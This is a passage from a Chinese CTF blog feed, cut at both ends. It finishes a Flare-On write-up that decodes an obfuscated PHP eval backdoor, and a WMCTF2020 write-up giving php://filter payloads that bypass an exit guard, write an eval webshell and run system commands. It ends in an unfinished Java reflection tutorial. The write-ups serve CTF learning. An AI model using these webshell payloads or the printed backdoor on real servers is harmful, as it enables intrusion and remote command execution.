class="hljs-number">28</span>, <span class="hljs-number">23</span>, <span class="hljs-number">75</span>, <span class="hljs-number">77</span>, <span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>, <span class="hljs-number">43</span>, <span class="hljs-number">52</span>, <span class="hljs-number">31</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">75</span>, <span class="hljs-number">77</span>, <span class="hljs-number">35</span>, <span class="hljs-number">47</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">40</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">77</span>, <span class="hljs-number">49</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">49</span>, <span class="hljs-number">51</span>, <span class="hljs-number">4</span>, <span class="hljs-number">51</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">70</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">49</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">70</span>, <span class="hljs-number">21</span>, <span class="hljs-number">47</span>, <span class="hljs-number">93</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">58</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">29</span>, <span class="hljs-number">29</span>, <span class="hljs-number">47</span>);<br><span class="hljs-variable">$do_me</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$order</span>);<span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-variable">$do_me</span>=<span class="hljs-variable">$do_me</span>.<span class="hljs-variable">$terms</span>[<span class="hljs-variable">$order</span>[<span class="hljs-variable">$i</span>]];<br>&#125;<br><span class="hljs-comment">#   echo($do_me);</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$do_me</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>回显一下do_me。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>= \<span class="hljs-string">&#x27;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\&#x27;;</span><br><span class="hljs-string">$__=\&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\&#x27;;</span><br><span class="hljs-string">$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;</span><br><span class="hljs-string">eval($___($__));</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>base64解码一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;\x61\x31\x31\x44\x4F\x54\x74\x68\x61\x74\x44\x4F\x54\x6A\x61\x76\x61\x35\x63\x72\x61\x70\x41\84\x66\x6C\x61\x72\x65\x44\65\x53\72\111\110\x44\79\84\99\x6F\x6D&quot;</span>]))<br>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&quot;</span>]));<br>&#125;<br><span class="hljs-variable">$code</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><p>这里就没有去写脚本了。\ 后面跟十进制数，\x 后面跟十六进制数。网站直接16进制转字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 16进制">\x61\x31\x31\x44\x4F\x54\x74\x68\x61\x74\x44\x4F\x54\x6A\x61\x76\x61\x35\x63\x72\x61\x70\x41\x54\x66\x6C\x61\x72\x65\x44\x41\x53\x48\x6f\x6e\x44\x4f\x54\x63\x6F\x6D<br><br>a11DOTthatDOTjava5crapATflareDASHonDOTcom<br></code></pre></td></tr></table></figure><p>后续是看了wp的。</p><p><strong>按照 flareon 比赛 flag 的尿性，DOT 要换成 .，AT 换成 @，DASH 换成 -，得到最终的 flag</strong><br>最终<a href="mailto:&#97;&#x31;&#x31;&#46;&#x74;&#104;&#x61;&#x74;&#x2e;&#106;&#x61;&#x76;&#x61;&#53;&#x63;&#114;&#x61;&#x70;&#64;&#x66;&#108;&#x61;&#x72;&#x65;&#45;&#111;&#110;&#46;&#99;&#x6f;&#x6d;">&#97;&#x31;&#x31;&#46;&#x74;&#104;&#x61;&#x74;&#x2e;&#106;&#x61;&#x76;&#x61;&#53;&#x63;&#114;&#x61;&#x70;&#64;&#x66;&#108;&#x61;&#x72;&#x65;&#45;&#111;&#110;&#46;&#99;&#x6f;&#x6d;</a>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210449.png"></p><h2 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h2><p>进去一看代码 感觉读懂了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210648.png" alt="QQ截图20220215113647"></p><p>洋洋得意直接构造链接—&gt;<a href="http://48571e46-9b1c-4cf3-9889-cfbef23ea393.node4.buuoj.cn:81/?content=flag.php">http://48571e46-9b1c-4cf3-9889-cfbef23ea393.node4.buuoj.cn:81/?content=flag.php</a><br>很打脸。<br>然后再仔细读了读。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>();&gt;<br></code></pre></td></tr></table></figure><p>这不是直接就退出了嘛。网上翻阅很久资料后续看到p神的文章。<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><h3 id="绕过-lt-php-exit-gt"><a href="#绕过-lt-php-exit-gt" class="headerlink" title="绕过&lt;?php exit();&gt;"></a>绕过&lt;?php exit();&gt;</h3><p><a href="https://bbs.pediy.com/thread-271283.htm%E8%BF%99%E6%98%AFh3%E5%B8%88%E5%82%85%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E5%BB%BA%E8%AE%AE%E8%AF%A6%E8%AF%BB%E3%80%82">https://bbs.pediy.com/thread-271283.htm这是h3师傅的文章，建议详读。</a></p><h3 id="巧用base64编码"><a href="#巧用base64编码" class="headerlink" title="巧用base64编码"></a>巧用base64编码</h3><p>p神文章讲的很清楚。<br>自己不很清楚点的。</p><ul><li>&#96;&#96;&#96;php<br>$content .&#x3D; $_POST[‘txt’];  #这里的点是连接的意思，哈哈哈小白非常菜 仔细读p神的文章及他的图片+半猜半蒙<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- base64解码方式：“phpexit”一共<span class="hljs-number">7</span>个字符，因为base64算法解码时是<span class="hljs-number">4</span>个byte一组，所以给他增加<span class="hljs-number">1</span>个“a”一共<span class="hljs-number">8</span>个字符。这样，<span class="hljs-string">&quot;phpexita&quot;</span>被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是`<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>; <span class="hljs-meta">?&gt;</span>`没有了。<br><br>- ```php<br>  <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>])<br>  <span class="hljs-comment">#匹配字符 替换成的字符 替换目标</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="巧用字符串操作"><a href="#巧用字符串操作" class="headerlink" title="巧用字符串操作"></a>巧用字符串操作</h3><ul><li><pre><code class="php">&lt;?php exit; ?&gt; # 实际上是一个XML标签<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```php<br>  strip_tags() # — 从字符串中去除 HTML 和 PHP 标记<br></code></pre></td></tr></table></figure></code></pre></li><li><p>php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p></li><li><p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了。</p></li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h3><p>rot3加密：<a href="http://www.hiencode.com/rot13.html">http://www.hiencode.com/rot13.html</a><br>require_once:<a href="https://www.php.net/manual/zh/function.require-once.php">https://www.php.net/manual/zh/function.require-once.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">#rot3编码</span><br>cuc @<span class="hljs-title function_ invoke__">riny</span>(<span class="hljs-variable">$_cbfg</span>[<span class="hljs-string">&#x27;pzq&#x27;</span>]);<br><br>php:<span class="hljs-comment">//filter/write=string.%7%32ot13|cuc @riny($_cbfg[&#x27;pzq&#x27;]);|/resource=shell.php </span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215144143.png" alt="QQ截图20220215144143"></p><p>这里就导致不能直接写入一句话木马，导致每次都要重写文件。(来自<strong>H3h3QAQ</strong>)师傅的解答。</p><h3 id="过滤器绕过"><a href="#过滤器绕过" class="headerlink" title="过滤器绕过"></a>过滤器绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">?<br>content=php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=h3.php</span><br><br>?content=h3.php&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);  <br><br>?content=php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=h3.php</span><br><br>?content=h3.php&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>); <br><br></code></pre></td></tr></table></figure><p>这里直接采用h3师傅的绕过。哈哈哈。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210486.png" alt="QQ截图20220215145358"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210881.png" alt="QQ截图20220215144737"></p><p>帮婆婆拖地去了，明天就要走了。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初理解反射</title>
    <link href="/2022/02/25/%E5%88%9D%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/02/25/%E5%88%9D%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="初理解反射"><a href="#初理解反射" class="headerlink" title="初理解反射"></a>初理解反射</h1><h2 id="理解反射"><a href="#理解反射" class="headerlink" title="理解反射"></a>理解反射</h2><p>Java中的反射机制是指<strong>在运行状态中</strong>，对于任意一个类都能够知道这个类所有的属性和方法；并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。</p><p>这里的可以在运行状态中获取修改值很棒。以后的cc链就要用到。</p><h2 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Class.forName(&quot;全类名&quot;) 该过程处于字节码阶段</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">cls1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;xsw6a.Person&quot;</span>);<br>System.out.println(cls1);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//类名.class属性 该过程处于内存阶段</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">cls2</span> <span class="hljs-operator">=</span> Person.class;<br>System.out.println(cls2);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//对象.getClass()方法 该过程处于运行阶段</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls3</span> <span class="hljs-operator">=</span> p.getClass();<br>System.out.println(cls3);<br></code></pre></td></tr></table></figure><h2 id="类对象中有什么？"><a href="#类对象中有什么？" class="headerlink" title="类对象中有什么？"></a>类对象中有什么？</h2><ul><li>成员变量（Field对象，Field[] fields）</li><li>构造方法   (Constructor对象，Constructor[] cons)</li><li>成员方法  (Method对象，Method[] methods)</li></ul><h2 id="三种阶段"><a href="#三种阶段" class="headerlink" title="三种阶段"></a>三种阶段</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252218849.png" alt="image-20200411205831842"></p><h3 id="source源代码阶段"><a href="#source源代码阶段" class="headerlink" title="source源代码阶段"></a>source源代码阶段</h3><p>此时刚刚编译为字节码，仍然保存在硬盘上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">cls1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;xsw6a.Person&quot;</span>);<br>System.out.println(cls1);<br></code></pre></td></tr></table></figure><h3 id="Class类对象阶段"><a href="#Class类对象阶段" class="headerlink" title="Class类对象阶段"></a>Class类对象阶段</h3><p>类加载器把Person.class字节码加载进内存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">cls2</span> <span class="hljs-operator">=</span> Person.class;<br>System.out.println(cls2);<br></code></pre></td></tr></table></figure><h3 id="运行时阶段"><a href="#运行时阶段" class="headerlink" title="运行时阶段"></a>运行时阶段</h3><p>这个时候类对象已经实例化成为了一个对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls3</span> <span class="hljs-operator">=</span> p.getClass();<br>System.out.println(cls3);<br></code></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>使用Class.forName()会自动初始化该Class对象，Class.forName() 方法 当类加载进了内存，只有<strong>静态初始块</strong>得到了执行。getDeclaredxxx 不能获取父类的方法。</li><li>使用类名.class来创建Class对象的引用时，不会自动初始化该Class对象</li><li>Class.forName() 属于动态加载类。将字节码文件加载进内存，参数需要类的全限定名</li></ul><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="Person类"><a href="#Person类" class="headerlink" title="Person类"></a>Person类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;吃饭&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;打篮球&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="反射获取"><a href="#反射获取" class="headerlink" title="反射获取"></a>反射获取</h3><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><ul><li>Fields[] getFields()：只能获取所有public修饰的成员变量</li><li>Fields getField(String name)：获取特定成员变量</li><li>Fields[] getDeclaredFields()：获取所有的成员变量，【不考虑】修饰符，不考虑继承</li><li>Fields getDeclaredField(String name)：获取特定的成员变量，【不考虑】修饰符，不考虑继承</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoFields</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        Field[] fields = personClass.getFields();<br>        <span class="hljs-keyword">for</span>(Field field : fields)&#123;<br>            System.out.println(field);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只会获取public属性的成员变量。（不会有任何回显，该方法不会直接获取所有成员变量）。</p><p>想要获取所有成员变量如下(有回显)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFields</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        Field[] declaredFields = personClass.getDeclaredFields();<br>        <span class="hljs-keyword">for</span>(Field declaredField : declaredFields)&#123;<br>            System.out.println(declaredField);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252130870.png" alt="QQ截图20220225212503"></p><p>给Person类赋值（这里采用的是<code>getField</code>,只能采用重新设置public属性赋值）<br>修改<code>person</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> String a;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setA</span><span class="hljs-params">(String a)</span> &#123;<br>        <span class="hljs-built_in">this</span>.a = a;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + 